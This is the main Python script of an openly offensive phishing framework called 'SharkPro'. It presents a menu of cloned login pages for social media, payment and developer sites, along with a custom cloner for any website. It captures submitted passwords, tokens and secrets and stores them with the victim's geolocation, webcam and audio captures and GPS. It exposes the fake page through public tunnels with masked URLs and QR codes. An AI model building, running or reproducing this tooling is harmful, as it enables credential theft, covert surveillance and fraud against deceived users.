#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SharkPro v3.0 - Advanced Phishing Framework
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓▓   ▓▓▓▓▓▓  ▓▓▓▓▓▓▓   ▓▓▓▓▓▓  ▓▓▓▓▓▓▓▓    ▓▓▓▓▓▓  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓▓  ▓▓  ▓▓  ▓▓  ▓▓▓▓  ▓▓  ▓▓▓▓  ▓▓   ▓▓  ▓▓   ▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓▓  ▓▓  ▓▓  ▓▓  ▓▓▓▓  ▓▓  ▓▓▓▓  ▓▓▓▓▓▓    ▓▓▓▓▓▓   ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓▓  ▓▓  ▓▓  ▓▓  ▓▓▓▓  ▓▓  ▓▓▓▓  ▓▓   ▓▓      ▓▓▓▓   ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓▓   ▓▓▓▓▓▓  ▓▓▓▓▓▓▓   ▓▓▓▓▓▓  ▓▓    ▓▓  ▓▓▓▓▓▓    ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓▓                                                       v3.0 2026 Edition
"""

import os
import sys
import time
import shutil
import signal

# Ensure all modules can be imported
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from config import PORT, SERVER_HOST, SERVER_DIR, setup_dirs, TEMPLATES, TUNNEL_SERVICES, CREDS_FILE, CAPTURES_DIR, TEMPLATES_DIR, R, G, Y, C, W, NC, BANNER
from core.server import SharkServer
from core.database import CredentialDB
from modules.tunnel import TunnelManager
from modules.geo import GeoLocator
from modules.cloner import WebsiteCloner
from modules.mask import URLMasker


class SharkPro:
    """Main application class"""
    
    def __init__(self):
        self.setup_dirs()
        self.server = SharkServer()
        self.db = CredentialDB()
        self.tunnel = TunnelManager()
        self.geo = GeoLocator()
        self.cloner = WebsiteCloner()
        self.masker = URLMasker()
        
        self.current_template = {}
        self.running = False
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def setup_dirs(self):
        """Create required directories"""
        setup_dirs()
    
    def signal_handler(self, signum, frame):
        """Handle Ctrl+C"""
        print(f"\n{Y}\n[*] Interrupted! Shutting down...{NC}")
        self.cleanup()
        sys.exit(0)
    
    def cleanup(self):
        """Clean up resources"""
        print(f"\n{Y}[*] Cleaning up...{NC}")
        
        self.server.stop()
        self.tunnel.stop_all()
        
        # Show summary
        stats = self.db.get_stats()
        print(f"\n{G}╔════════════════════════════════════════════╗{NC}")
        print(f"{G}║{C}              SESSION SUMMARY                {G}║{NC}")
        print(f"{G}╠════════════════════════════════════════════╣{NC}")
        print(f"{G}║{NC} Total Credentials: {stats['total_creds']:<24}{G}║{NC}")
        print(f"{G}║{NC} Total Captures:    {stats['total_captures']:<24}{G}║{NC}")
        print(f"{G}║{NC} Data saved to:     {CREDS_FILE:<24}{G}║{NC}")
        print(f"{G}╚════════════════════════════════════════════╝{NC}\n")
    
    def print_banner(self):
        """Display banner and clear screen"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print(BANNER)
    
    def print_menu(self):
        """Display main menu"""
        print(f"\n{Y}╔═══════════════════════════════════════════════════════════╗{NC}")
        print(f"{Y}║{C}                  🦈  SELECT ATTACK  🦈                      {Y}║{NC}")
        print(f"{Y}╠═══════════════════════════════════════════════════════════╣{NC}")
        
        # Social Media
        print(f"{Y}║{G}  SOCIAL MEDIA:{Y}                                              ║{NC}")
        social = ["01", "02", "07", "08", "13", "14", "15", "19", "20"]
        for code in social:
            if code in TEMPLATES:
                t = TEMPLATES[code]
                print(f"{Y}║{NC}  [{G}{code}{NC}] {t['name']:<15} - {t['desc'][:35]:<35}{Y}║{NC}")
        
        # Entertainment
        print(f"{Y}║{G}  ENTERTAINMENT:{Y}                                             ║{NC}")
        ent = ["05", "10", "09"]
        for code in ent:
            if code in TEMPLATES:
                t = TEMPLATES[code]
                print(f"{Y}║{NC}  [{G}{code}{NC}] {t['name']:<15} - {t['desc'][:35]:<35}{Y}║{NC}")
        
        # Tools/Advanced
        print(f"{Y}║{G}  ADVANCED TOOLS:{Y}                                            ║{NC}")
        adv = ["06", "12", "16", "17", "18"]
        for code in adv:
            if code in TEMPLATES:
                t = TEMPLATES[code]
                print(f"{Y}║{NC}  [{G}{code}{NC}] {t['name']:<15} - {t['desc'][:35]:<35}{Y}║{NC}")
        
        # Payment
        print(f"{Y}║{G}  PAYMENT:{Y}                                                   ║{NC}")
        pay = ["04"]
        for code in pay:
            if code in TEMPLATES:
                t = TEMPLATES[code]
                print(f"{Y}║{NC}  [{G}{code}{NC}] {t['name']:<15} - {t['desc'][:35]:<35}{Y}║{NC}")
        
        # Developer
        print(f"{Y}║{G}  DEVELOPER:{Y}                                                 ║{NC}")
        dev = ["11"]
        for code in dev:
            if code in TEMPLATES:
                t = TEMPLATES[code]
                print(f"{Y}║{NC}  [{G}{code}{NC}] {t['name']:<15} - {t['desc'][:35]:<35}{Y}║{NC}")
        
        # Special
        print(f"{Y}╠═══════════════════════════════════════════════════════════╣{NC}")
        print(f"{Y}║{NC}  [{C}99{NC}] {Y}Custom Clone{NC} - Clone any website                       {Y}║{NC}")
        print(f"{Y}║{NC}  [{C}00{NC}] {R}Exit{NC}                                              {Y}║{NC}")
        print(f"{Y}╚════════════════════════════════════════════════===========╝{NC}")
    
    def handle_capture(self, event_type, ip, user_agent, path, data):
        """Handle captured data"""
        if event_type == "visit":
            print(f"\n{Y}[👁] {ip} visited {path}{NC}")
            geo = self.geo.lookup(ip)
            
        elif event_type == "credentials":
            print(f"\n{G}{'='*60}{NC}")
            print(f"{G}[🔥] CREDENTIALS CAPTURED!{NC}")
            print(f"{Y}From: {W}{ip}{NC}")
            print(f"{Y}Template: {W}{self.current_template.get('name', 'Unknown')}{NC}")
            
            geo = self.geo.lookup(ip)
            self.geo.display(ip)
            
            print(f"\n{C}Captured Data:{NC}")
            for key, value in data.items():
                if any(k in key.lower() for k in ['pass', 'pwd', 'token', 'key', 'secret']):
                    print(f"  {G}{key}:{NC} {W}{value[:50]}{NC}")
                else:
                    print(f"  {C}{key}:{NC} {value[:50]}")
            
            # Save to database
            session_id = self.db.save_credentials(
                ip, user_agent, self.current_template, data, geo
            )
            
            print(f"\n{G}[✓] Saved to database (Session: {session_id}){NC}")
            print(f"{G}{'='*60}{NC}\n")
            
        elif event_type == "camera":
            self.db.save_capture(ip, "camera", data.get('file'))
            
        elif event_type == "audio":
            self.db.save_capture(ip, "audio", data.get('file'))
            
        elif event_type == "location":
            print(f"\n{G}[📍] Precise GPS: {data.get('lat')}, {data.get('lon')}{NC}")
    
    def select_template(self, choice):
        """Load selected template"""
        if choice == "99":
            # Custom clone
            url = input(f"{Y}Enter URL to clone: {NC}").strip()
            if self.cloner.clone(url):
                self.current_template = {
                    "name": "Custom Clone",
                    "redirect": url,
                    "type": "custom"
                }
                return True
            return False
        
        choice = choice.zfill(2)
        
        if choice not in TEMPLATES:
            print(f"{R}[!] Invalid selection{NC}")
            return False
        
        template = TEMPLATES[choice]
        self.current_template = template
        
        # Copy template to server directory
        template_path = os.path.join('templates', template['file'])
        if os.path.exists(template_path):
            shutil.copy(template_path, f"{SERVER_DIR}/index.html")
            print(f"{G}[✓] Loaded: {template['name']}{NC}")
            return True
        else:
            print(f"{R}[!] Template file not found{NC}")
            return False
    
    def select_tunnel(self):
        """Select tunnel service"""
        print(f"\n{Y}╔═══════════════════════════════════════════════════════════╗{NC}")
        print(f"{Y}║{C}                  🌐  TUNNEL SELECTION  🌐                  {Y}║{NC}")
        print(f"{Y}╠═══════════════════════════════════════════════════════════╣{NC}")
        print(f"{Y}║{NC}  [{G}A{NC}] {C}Ngrok{NC}        (Global, may be blocked)              {Y}║{NC}")
        print(f"{Y}║{NC}  [{G}B{NC}] {C}Cloudflared{NC}  (Fast, reliable)                   {Y}║{NC}")
        print(f"{Y}║{NC}  [{G}C{NC}] {C}Localhost.run{NC} (SSH-based, persistent)           {Y}║{NC}")
        print(f"{Y}║{NC}  [{G}D{NC}] {C}Localtunnel{NC}  (npm-based)                        {Y}║{NC}")
        print(f"{Y}║{NC}  [{G}E{NC}] {C}Localhost{NC}    ( LAN only, testing)                {Y}║{NC}")
        print(f"{Y}╚═══════════════════════════════════════════════════════════╝{NC}\n")
        
        choice = input(f"{C}Select (A/B/C/D/E): {NC}").strip().upper()
        
        tunnel_map = {
            'A': 'ngrok',
            'B': 'cloudflared',
            'C': 'localhost-run',
            'D': 'localtunnel',
            'E': 'localhost'
        }
        
        service = tunnel_map.get(choice, 'localhost')
        
        if service == 'localhost':
            return self.tunnel.start_localhost(PORT)
        elif service == 'ngrok':
            return self.tunnel.start_ngrok(PORT)
        elif service == 'cloudflared':
            return self.tunnel.start_cloudflared(PORT)
        elif service == 'localhost-run':
            return self.tunnel.start_localhost_run(PORT)
        elif service == 'localtunnel':
            return self.tunnel.start_localtunnel(PORT)
        
        return None
    
    def run(self):
        """Main application loop"""
        self.print_banner()
        
        while True:
            self.print_menu()
            
            choice = input(f"\n{C}sharkpro{NC} {G}>>{NC} ").strip().lower()
            
            if choice == '00':
                print(f"{Y}Goodbye!{NC}")
                break
            
            if not self.select_template(choice):
                continue
            
            # Select tunnel
            url = self.select_tunnel()
            
            if not url:
                print(f"{R}[!] Failed to establish tunnel{NC}")
                continue
            
            # Start server
            self.server.start(self.handle_capture)
            
            # Apply URL masking if not localhost
            if 'localhost' not in url:
                final_url = self.masker.custom_mask(url)
                self.masker.generate_qr(final_url)
                url = final_url
            
            print(f"\n{G}{'='*60}{NC}")
            print(f"{G}[✓] SharkPro is running!{NC}")
            print(f"{C}[+] URL: {W}{url}{NC}")
            print(f"{C}[+] Press Ctrl+C to stop{NC}")
            print(f"{G}{'='*60}{NC}\n")
            
            # Keep running
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                pass
            
            self.cleanup()
            break


def check_requirements():
    """Check if all requirements are installed"""
    required = ['requests', 'colorama']
    missing = []
    
    for pkg in required:
        try:
            __import__(pkg)
        except ImportError:
            missing.append(pkg)
    
    if missing:
        print(f"{R}[!] Missing packages: {', '.join(missing)}{NC}")
        print(f"{Y}[*] Run: pip install -r requirements.txt{NC}")
        return False
    
    return True


if __name__ == "__main__":
    if not check_requirements():
        sys.exit(1)
    
    app = SharkPro()
    app.run()